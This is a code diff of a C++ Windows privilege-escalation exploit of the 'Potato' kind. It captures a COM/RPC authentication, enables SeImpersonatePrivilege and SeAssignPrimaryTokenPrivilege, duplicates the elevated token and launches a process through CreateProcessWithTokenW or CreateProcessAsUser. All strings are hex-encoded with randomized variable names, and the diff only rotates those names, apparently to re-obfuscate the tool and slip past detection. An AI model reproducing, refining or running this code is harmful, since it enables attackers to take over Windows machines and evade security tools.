-	const char  hid______a_uahSWjOmbfo3[] = {'\n','\x5b','\x2b','\x5d','\x20','\x61','\x75','\x74','\x68','\x72','\x65','\x73','\x75','\x6c','\x74','\x20','\x25','\x64','\n',0};
+	const char  hid______a_FubBrMApaFpD[] = {'\n','\x5b','\x2b','\x5d','\x20','\x61','\x75','\x74','\x68','\x72','\x65','\x73','\x75','\x6c','\x74','\x20','\x25','\x64','\n',0};
 
-	const wchar_t  hid_S_e_I__ccow6VjpKV5Q[] = {'\x53','\x65','\x49','\x6d','\x70','\x65','\x72','\x73','\x6f','\x6e','\x61','\x74','\x65','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
+	const wchar_t  hid_S_e_I__wwJOQnMAVCIe[] = {'\x53','\x65','\x49','\x6d','\x70','\x65','\x72','\x73','\x6f','\x6e','\x61','\x74','\x65','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
 
-	const wchar_t  hid_S_e_A__fLBCOZlLiL2I[] = {'\x53','\x65','\x41','\x73','\x73','\x69','\x67','\x6e','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x54','\x6f','\x6b','\x65','\x6e','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
+	const wchar_t  hid_S_e_A__OeVD0UWgsSXi[] = {'\x53','\x65','\x41','\x73','\x73','\x69','\x67','\x6e','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x54','\x6f','\x6b','\x65','\x6e','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
 
-	const char  hid_____Er_9B76ck7UwzAC[] = {'\x5b','\x2d','\x5d','\x20','\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
+	const char  hid_____Er_yE3qaARbzYd6[] = {'\x5b','\x2d','\x5d','\x20','\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
 
-	const char  hid_Error__TeGHzMTeqOd4[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
+	const char  hid_Error__yiQSooT4Roaf[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
 
-	const char  hid______C_z3mNiqm08QyF[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid______C_EyEZ45wfAp7A[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid______C_ba1srR6Bmal3[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x4f','\x4b','\n',0};
+	const char  hid______C_Wf467XIF7ngV[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x4f','\x4b','\n',0};
 
-	 wchar_t  hid_C______P61fJOqiWjb4[] = {'\x43','\x3a','\\',0};
+	 wchar_t  hid_C______Ib1Ci1jWT8a1[] = {'\x43','\x3a','\\',0};
 
-	const char  hid______C_YBy2KbmSvSzd[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid______C_PRzY3qRkyXdc[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid______C_9HIQXhoZQHdf[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x4f','\x4b','\n',0};
+	const char  hid______C_Xr8DpjItbZYa[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x4f','\x4b','\n',0};
 
-	const char  hid_Waitin_l6RMkuFHWg8c[] = {'\x57','\x61','\x69','\x74','\x69','\x6e','\x67','\x20','\x66','\x6f','\x72','\x20','\x61','\x75','\x74','\x68','\x2e','\x2e','\x2e',0};
+	const char  hid_Waitin_D83idmlIaVH3[] = {'\x57','\x61','\x69','\x74','\x69','\x6e','\x67','\x20','\x66','\x6f','\x72','\x20','\x61','\x75','\x74','\x68','\x2e','\x2e','\x2e',0};
 PotatoAPI* test = new PotatoAPI();
 	test->startCOMListenerThread();
 
@@ -679,7 +709,7 @@ PotatoAPI* test = new PotatoAPI();
 		olestr = clsid;
 
 	if (!TEST_mode)
-		printf(hid_Testin_2jH42VV4RFRK, olestr, g_port);
+		printf(hid_Testin_Ydf7Ang4gRse, olestr, g_port);
 
 
 	test->startRPCConnectionThread();
@@ -697,7 +727,7 @@ PotatoAPI* test = new PotatoAPI();
 			TOKEN_PRIVILEGES tkp;
 			SECURITY_DESCRIPTOR sdSecurityDescriptor;
 			if (!TEST_mode)
-				printf(hid______a_uahSWjOmbfo3, test->negotiator->authResult);
+				printf(hid______a_FubBrMApaFpD, test->negotiator->authResult);
 
 			fflush(stdout);
 
@@ -706,8 +736,8 @@ PotatoAPI* test = new PotatoAPI();
 				TOKEN_ALL_ACCESS, &hToken))return 0;
 
 			//enable privileges
-			EnablePriv(hToken, hid_S_e_I__ccow6VjpKV5Q);
-			EnablePriv(hToken, hid_S_e_A__fLBCOZlLiL2I);
+			EnablePriv(hToken, hid_S_e_I__wwJOQnMAVCIe);
+			EnablePriv(hToken, hid_S_e_A__OeVD0UWgsSXi);
 			PTOKEN_TYPE ptg;
 			DWORD dwl = 0;
 			HANDLE hProcessToken;
@@ -721,7 +751,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_____Er_9B76ck7UwzAC, GetLastError());
+				printf(hid_____Er_yE3qaARbzYd6, GetLastError());
 
 			result = DuplicateTokenEx(elevated_token,
 				TOKEN_ALL_ACCESS,
@@ -733,7 +763,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_Error__TeGHzMTeqOd4, GetLastError());
+				printf(hid_Error__yiQSooT4Roaf, GetLastError());
 
 			DWORD SessionId;
 			PROCESS_INFORMATION pi;
@@ -773,11 +803,11 @@ PotatoAPI* test = new PotatoAPI();
 
 				if (!result)
 				{
-					printf(hid______C_z3mNiqm08QyF, GetLastError());
+					printf(hid______C_EyEZ45wfAp7A, GetLastError());
 				}
 				else
 				{
-					printf(hid______C_ba1srR6Bmal3);
+					printf(hid______C_Wf467XIF7ngV);
 					break;
 				}
 			} 
@@ -791,14 +821,14 @@ PotatoAPI* test = new PotatoAPI();
 					command,
 					nullptr, nullptr,
 					FALSE, 0, nullptr,
-					hid_C______P61fJOqiWjb4, &si, &pi
+					hid_C______Ib1Ci1jWT8a1, &si, &pi
 				);
 
 				if (!result) {
-					printf(hid______C_YBy2KbmSvSzd, GetLastError());
+					printf(hid______C_PRzY3qRkyXdc, GetLastError());
 				}
 				else {
-					printf(hid______C_9HIQXhoZQHdf);
+					printf(hid______C_Xr8DpjItbZYa);
 					break;
 				}
 			}//end argv
@@ -806,7 +836,7 @@ PotatoAPI* test = new PotatoAPI();
 			if (!result)
 				break;
 			else {
-				printf(hid_Waitin_l6RMkuFHWg8c);
+				printf(hid_Waitin_D83idmlIaVH3);
 				Sleep(500);
 				fflush(stdout);
 			}
